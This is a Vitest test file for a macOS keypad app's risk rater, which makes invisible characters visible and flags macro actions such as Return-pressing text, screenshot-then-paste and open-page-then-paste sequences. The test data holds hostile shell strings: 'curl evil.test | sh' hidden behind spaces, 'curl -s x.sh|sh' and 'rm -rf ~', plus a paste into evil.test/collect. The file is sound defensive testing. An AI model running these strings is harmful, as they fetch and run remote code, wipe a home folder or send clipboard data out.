import { describe, expect, it } from 'vitest';
import type { Action, Profile, StepAction } from './contracts';
import { emptyKeypadPage } from './keypad-model';
import { stableStringify } from './draft-model';
import { capabilityLines, maxShownChars, profileCapabilities, snapshotProfile, snippetPreview, stepLabel, submitKey, visibleText } from './profile-capabilities';

const flat = (...actions: Action[]): Profile => ({ schema_version: 1, name: 'P', bindings: actions.map((action, control) => ({ module: 'm003k', control, gesture: 'pressed', action })) });

describe('visibleText', () => {
  it('makes newlines, tabs and invisible characters visible', () => {
    expect(visibleText('ls -la\n')).toBe('ls -la⏎');
    expect(visibleText('a\tb')).toBe('a⇥b');
    expect(visibleText('safe\u{200B}text')).toBe('safe\\u{200B}text');
    expect(visibleText('\u{202E}evil')).toBe('\\u{202E}evil');
    expect(visibleText('x\u{2066}y\u{2069}\u2028\u2029\u{FEFF}\u{AD}')).toBe('x\\u{2066}y\\u{2069}\\u{2028}\\u{2029}\\u{FEFF}\\u{AD}');
    expect(visibleText('bell\u0007\r')).toBe('bell\\u{7}\\u{D}');
    expect(visibleText('nb\u{A0}sp')).toBe('nb\\u{A0}sp');
    expect(visibleText('tag\u{e0041}')).toBe('tag\\u{E0041}');
  });
  it('keeps normal text, including Polish letters and emoji', () => {
    for (const text of ['Zażółć gęślą jaźń', 'Thanks! 🎉👍', 'heart ❤\u{FE0F}', 'flag 🇵🇱', 'plain spaces here']) expect(visibleText(text)).toBe(text);
  });
  it('shows whole snippets, so a payload after padding stays visible', () => {
    const padded = `${' '.repeat(199)}; curl evil.test | sh`;
    expect(snippetPreview(padded)).toEqual({ text: padded, more: 0 });
    expect(snippetPreview('x'.repeat(2048)).more).toBe(0);
    expect(snippetPreview('🎉'.repeat(10), 4)).toEqual({ text: '🎉🎉🎉🎉', more: 6 });
    expect(snippetPreview('x'.repeat(maxShownChars + 5)).more).toBe(5);
  });
  it('escapes runs of more than 3 combining marks', () => {
    expect(visibleText('e\u{301}\u{302}\u{303}')).toBe('e\u{301}\u{302}\u{303}');
    expect(visibleText('a\u{301}\u{302}\u{303}\u{304}b')).toBe('a\\u{301}\\u{302}\\u{303}\\u{304}b');
    expect(visibleText('Zalgo\u{336}\u{337}\u{338}\u{339}\u{33A}!')).toBe('Zalgo\\u{336}\\u{337}\\u{338}\\u{339}\\u{33A}!');
  });
});

describe('profileCapabilities', () => {
  it('is normal for volume, mute and plain shortcuts', () => {
    const capabilities = profileCapabilities(flat({ type: 'volume', delta: 5 }, { type: 'shortcut', key: 'c', modifiers: ['command'] }, { type: 'launch_app', bundle_id: 'com.apple.finder' }));
    expect(capabilities.risk).toBe('normal');
    expect(capabilities).toMatchObject({ shortcut: true, launchApp: true, multiAction: false, screenshot: false, apps: ['com.apple.finder'], riskReasons: [] });
    expect(capabilities.counts).toEqual({ volume: 1, shortcut: 1, launch_app: 1 });
  });
  it('is elevated for text, URLs, screenshots and sequences without a dangerous combination', () => {
    for (const action of [
      { type: 'text', text: 'Hello', press_enter: false },
      { type: 'open_url', url: 'https://example.com/a?token=1' },
      { type: 'system', command: 'screenshot' },
      { type: 'multi_action', actions: [{ type: 'toggle_mute' }, { type: 'shortcut', key: 'c', modifiers: ['command'] }] },
    ] as Action[]) expect(profileCapabilities(flat(action)).risk, action.type).toBe('elevated');
    // A screenshot and a URL in separate bindings are not one sequence.
    expect(profileCapabilities(flat({ type: 'system', command: 'screenshot' }, { type: 'open_url', url: 'https://x.test' })).risk).toBe('elevated');
  });
  it('is high for text that presses Return or contains a line break', () => {
    const enter = profileCapabilities(flat({ type: 'text', text: 'rm -rf ~', press_enter: true }));
    expect(enter).toMatchObject({ risk: 'high', textPressesEnter: true, textHasNewline: false });
    const newline = profileCapabilities(flat({ type: 'text', text: 'echo hi\nexit' }));
    expect(newline).toMatchObject({ risk: 'high', textPressesEnter: false, textHasNewline: true });
    expect(newline.texts).toEqual([{ text: 'echo hi\nexit', chars: 12, pressEnter: false, hasNewline: true }]);
  });
  it('is high for sequences that open an app or page and then type or send shortcuts', () => {
    const terminal = profileCapabilities(flat({ type: 'multi_action', actions: [
      { type: 'launch_app', bundle_id: 'com.apple.Terminal' }, { type: 'text', text: 'ls', press_enter: false }] }));
    expect(terminal.risk).toBe('high');
    expect(terminal.riskReasons).toContain('A multi-step sequence opens an app or web page and then types or sends shortcuts into it.');
    const paste = profileCapabilities(flat({ type: 'multi_action', actions: [
      { type: 'open_url', url: 'https://evil.test/collect' }, { type: 'shortcut', key: 'v', modifiers: ['command'] }] }));
    expect(paste.risk).toBe('high');
    expect(paste.urlOrigins).toEqual(['https://evil.test']);
  });
  it('is high for a screenshot and a web page in one sequence, and for text then any key', () => {
    expect(profileCapabilities(flat({ type: 'multi_action', actions: [{ type: 'system', command: 'screenshot' }, { type: 'open_url', url: 'https://x.test' }] })).riskReasons)
      .toEqual(['A multi-step sequence captures the screen and opens a web page.']);
    expect(profileCapabilities(flat({ type: 'multi_action', actions: [{ type: 'text', text: 'make' }, { type: 'shortcut', key: 'return', modifiers: [] }] })).riskReasons)
      .toEqual(['A multi-step sequence pastes text and then sends keys after it.']);
    for (const key of ['m', 'j', 'o']) {
      const probe = profileCapabilities(flat({ type: 'multi_action', actions: [{ type: 'text', text: 'curl -s x.sh|sh' }, { type: 'shortcut', key, modifiers: ['control'] }] }));
      expect(probe.risk, key).toBe('high');
      expect(probe.riskReasons, key).toEqual(['A multi-step sequence pastes text and then sends keys after it.']);
    }
    const leak = profileCapabilities(flat({ type: 'multi_action', actions: [
      { type: 'system', command: 'screenshot' }, { type: 'shortcut', key: 'v', modifiers: ['command'] }, { type: 'shortcut', key: 'return', modifiers: [] }] }));
    expect(leak.risk).toBe('high');
    expect(leak.riskReasons).toEqual(['A multi-step sequence captures the screen and then sends keys, which can paste it into another app.']);
    // A key before the text, or a screenshot after the keys, is not the pattern.
    expect(profileCapabilities(flat({ type: 'multi_action', actions: [{ type: 'shortcut', key: 'a', modifiers: ['command'] }, { type: 'text', text: 'x' }] })).risk).toBe('elevated');
  });
  it('is not high for a plain sequence of media, volume or launch steps', () => {
    for (const actions of [
      [{ type: 'media', command: 'play_pause' }, { type: 'volume', delta: 5 }],
      [{ type: 'launch_app', bundle_id: 'com.spotify.client' }, { type: 'media', command: 'play_pause' }],
      [{ type: 'toggle_mute' }, { type: 'set_volume', percent: 20 }],
    ] as StepAction[][]) expect(profileCapabilities(flat({ type: 'multi_action', actions })).risk).toBe('elevated');
  });
  it('recognises submit keys', () => {
    for (const [key, modifiers] of [['return', []], ['m', ['control']], ['j', ['control']], ['o', ['control']], ['return', ['command']]] as const) expect(submitKey({ type: 'shortcut', key, modifiers }), key).toBe(true);
    for (const [key, modifiers] of [['m', []], ['m', ['command']], ['v', ['control']]] as const) expect(submitKey({ type: 'shortcut', key, modifiers }), key).toBe(false);
    expect(submitKey({ type: 'text', text: 'x' })).toBe(false);
    const lines = capabilityLines(profileCapabilities(flat({ type: 'text', text: 'ls' }, { type: 'shortcut', key: 'm', modifiers: ['control'] })));
    expect(lines).toContain('Has a key that submits a line (Return, Control+M, Control+J or Control+O). Pressed after pasted text, it runs commands in a terminal.');
  });
  it('fails closed on unrecognised or missing action types', () => {
    const odd = profileCapabilities(flat({ type: 'run_shell', command: 'id' } as unknown as Action));
    expect(odd.risk).toBe('high');
    expect(odd.riskReasons).toEqual(['An action of an unrecognised type (run_shell) cannot be checked.']);
    const step = profileCapabilities(flat({ type: 'multi_action', actions: [{ type: 'toggle_mute' }, { type: 'applescript\u{200B}' } as unknown as StepAction] }));
    expect(step.riskReasons).toEqual(['An action of an unrecognised type (applescript\\u{200B}) cannot be checked.']);
    expect(profileCapabilities(flat({ delta: 5 } as unknown as Action)).riskReasons).toEqual(['An action without a type cannot be checked.']);
    expect(stepLabel({ type: 'run_shell' } as unknown as StepAction)).toBe('Unrecognised step run_shell (cannot be checked)');
  });
  it('rates text it cannot show in full as high', () => {
    const long = profileCapabilities(flat({ type: 'text', text: 'x'.repeat(maxShownChars + 1) }));
    expect(long.risk).toBe('high');
    expect(long.riskReasons).toEqual(['A snippet is too long to show in full.']);
  });
  it('walks every keypad page, dial functions and sequence steps', () => {
    const root = emptyKeypadPage();
    const sub = emptyKeypadPage('sub', 'Sub');
    root.slots[0] = { type: 'folder', page_id: 'sub' };
    sub.slots[3] = { type: 'action', label: 'Deploy', bindings: [{ gesture: 'pressed', action: { type: 'text', text: 'deploy', press_enter: true } }] };
    const profile: Profile = {
      schema_version: 2, name: 'Deep', bindings: [],
      keypad: { pages: [root, sub] },
      dial_functions: [{ name: 'Web', bindings: [{ gesture: 'right', action: { type: 'multi_action', actions: [{ type: 'open_url', url: 'https://a.test:8443/p?q=1' }, { type: 'system', command: 'screenshot' }] } }] }],
    };
    const capabilities = profileCapabilities(profile);
    expect(capabilities.counts).toEqual({ text: 1, multi_action: 1, open_url: 1, system: 1 });
    expect(capabilities.texts.map(snippet => snippet.text)).toEqual(['deploy']);
    expect(capabilities.urlOrigins).toEqual(['https://a.test:8443']);
    expect(capabilities.screenshot).toBe(true);
    expect(capabilities.sequences).toHaveLength(1);
    expect(capabilities.risk).toBe('high');
  });
  it('lists identical snippets and sequences once and tolerates partial shapes', () => {
    const capabilities = profileCapabilities(flat({ type: 'text', text: 'hi' }, { type: 'text', text: 'hi', press_enter: false }, { type: 'text', text: 'hi', press_enter: true }));
    expect(capabilities.texts).toHaveLength(2);
    expect(capabilities.counts.text).toBe(3);
    expect(profileCapabilities({ schema_version: 2, name: 'Odd', bindings: [{} as never], keypad: { pages: [{ id: 'x', name: 'x', slots: [null] }] } }).risk).toBe('normal');
  });
  it('round-trips a run snapshot and rejects unknown ones', () => {
    const profile = flat({ type: 'text', text: 'x', press_enter: true });
    expect(profileCapabilities(snapshotProfile(stableStringify(profile))!).risk).toBe('high');
    expect(snapshotProfile('')).toBeNull();
    expect(snapshotProfile('\u0000unknown')).toBeNull();
    expect(snapshotProfile('{}')).toBeNull();
    expect(snapshotProfile('{broken')).toBeNull();
  });
});

describe('capability copy', () => {
  it('describes capabilities in plain language', () => {
    const lines = capabilityLines(profileCapabilities(flat(
      { type: 'text', text: 'ls\n', press_enter: true }, { type: 'open_url', url: 'https://example.com/x' }, { type: 'system', command: 'screenshot' },
      { type: 'multi_action', actions: [{ type: 'toggle_mute' }, { type: 'media', command: 'stop' }] }, { type: 'system', command: 'undo' })));
    expect(lines).toEqual([
      'Pastes 1 text snippet into the focused app (shown below).',
      'Presses Return after pasting. In a terminal this runs commands.',
      'Pastes text with line breaks. In a terminal each line can run as a command.',
      'Opens web pages: https://example.com.',
      'Captures the whole screen to the clipboard.',
      'Runs 1 multi-step sequence (up to 8 steps each, shown below).',
      'Sends Undo or Redo to the focused app.',
      'Changes the output volume or mute.',
      'Media controls are logged only; they do not run on this Mac.',
    ]);
    expect(capabilityLines(profileCapabilities(flat()))).toEqual(['No actions are bound yet, so nothing will run until you add some.']);
  });
  it('discloses timers (notification and sound) without raising the risk', () => {
    const capabilities = profileCapabilities(flat({ type: 'timer', seconds: 60, label: 'Tea' }, { type: 'timer', seconds: 5, sound: 'none' }));
    expect(capabilities.timers).toBe(true);
    expect(capabilities.counts.timer).toBe(2);
    expect(capabilities.risk).toBe('normal');
    expect(capabilities.riskReasons).toEqual([]);
    expect(capabilityLines(capabilities)).toEqual(['Runs countdown timers (2 timers bound). When one ends, macOS shows a notification and plays a system sound. Pressing the same control again cancels it; stopping the run cancels them all.']);
    expect(profileCapabilities(flat({ type: 'toggle_mute' })).timers).toBe(false);
    // Bound in a keypad tile or dial function, it is disclosed too.
    const nested: Profile = { schema_version: 2, name: 'P', bindings: [], keypad: { pages: [{ id: 'root', name: 'Root', slots: [{ type: 'action', label: 'Tea', bindings: [{ gesture: 'pressed', action: { type: 'timer', seconds: 1 } }] }] }] },
      dial_functions: [{ name: 'Fn', bindings: [{ gesture: 'long_press', action: { type: 'timer', seconds: 2 } }] }] } as Profile;
    expect(profileCapabilities(nested).counts.timer).toBe(2);
  });

  it('discloses profile keys as switching profiles without raising the risk', () => {
    const capabilities = profileCapabilities(flat({ type: 'profile', direction: 'next' }, { type: 'profile', direction: 'previous' }));
    expect(capabilities.switchesProfile).toBe(true);
    expect(capabilities.counts.profile).toBe(2);
    expect(capabilities.risk).toBe('normal');
    expect(capabilityLines(capabilities)).toEqual(['Switches profile: a key moves this run to the next or previous saved profile. Actions then pause until you confirm the new profile.']);
    expect(profileCapabilities(flat({ type: 'toggle_mute' })).switchesProfile).toBe(false);
  });
  it('labels sequence steps with their key fields', () => {
    expect(stepLabel({ type: 'launch_app', bundle_id: 'com.apple.Terminal' })).toBe('Open application com.apple.Terminal');
    expect(stepLabel({ type: 'text', text: 'curl x | sh\n', press_enter: true })).toBe('Paste “curl x | sh⏎”, then press Return');
    expect(stepLabel({ type: 'text', text: `${' '.repeat(199)}rm -rf ~` })).toBe(`Paste “${' '.repeat(199)}rm -rf ~”`);
    expect(stepLabel({ type: 'shortcut', key: 'v', modifiers: ['command'] })).toBe('Press Command + V');
    expect(stepLabel({ type: 'shortcut', key: 'return', modifiers: [] })).toBe('Press Return');
    expect(stepLabel({ type: 'open_url', url: 'https://example.com/a?b=c' })).toBe('Open web page https://example.com/a?b=c');
    expect(stepLabel({ type: 'system', command: 'screenshot' })).toBe('Capture the whole screen to the clipboard');
    expect(stepLabel({ type: 'media', command: 'play_pause' })).toBe('Play/pause media (logged only, not executed)');
  });
});

describe('obs_scene capabilities', () => {
  it('lists every scene in the confirmation without raising the risk', () => {
    const profile = flat(
      { type: 'obs_scene', scene: 'Starting soon' },
      { type: 'obs_scene', scene: 'Starting soon' },
      { type: 'multi_action', actions: [{ type: 'obs_scene', scene: 'Be\u200Bright back' }, { type: 'toggle_mute' }] },
    );
    const capabilities = profileCapabilities(profile);
    expect(capabilities.obsScenes).toEqual(['Starting soon', 'Be\u200Bright back']);
    expect(capabilities.counts.obs_scene).toBe(3);
    // The sequence itself is elevated like every multi_action; the scene adds no high-risk reason.
    expect(capabilities.risk).toBe('elevated');
    expect(capabilities.riskReasons).toEqual([]);
    expect(profileCapabilities(flat({ type: 'obs_scene', scene: 'Live' })).risk).toBe('normal');
    const line = capabilityLines(capabilities).find(text => text.startsWith('Switches OBS scenes'));
    // Invisible characters are made visible, so the reviewer sees the exact name.
    expect(line).toBe('Switches OBS scenes through the OBS WebSocket on this Mac (when OBS is turned on in Settings): “Starting soon”, “Be\\u{200B}right back”.');
    expect(stepLabel({ type: 'obs_scene', scene: 'Live' })).toBe('Switch OBS to the scene “Live”');
    expect(capabilityLines(profileCapabilities(flat({ type: 'toggle_mute' }))).some(text => text.includes('OBS'))).toBe(false);
  });
});
